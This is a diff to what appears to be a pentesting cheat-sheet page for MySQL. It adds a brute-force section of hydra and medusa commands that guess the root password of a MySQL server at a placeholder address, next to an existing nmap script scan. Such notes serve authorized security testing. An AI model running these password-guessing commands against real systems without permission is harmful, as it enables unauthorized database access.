@@ -24,6 +24,27 @@ sudo nmap -sV -sC -p3306 --script mysql* <IP>
 {% endtab %}
 {% endtabs %}
 
+### Brute-Force
+
+{% tabs %}
+{% tab title="hydra" %}
+{% code lineNumbers="true" %}
+```shellscript
+hydra -l root -P password_list.txt mysql://<IP>
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Medusa" %}
+{% code lineNumbers="true" %}
+```shellscript
+medusa -M mysql -h <IP> -u root -P passwords.txt
+medusa -M mysql -h <IP> -n <custom-port> -u root -P passwords.txt
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
+
 ### Enumeration
 
 {% tabs %}
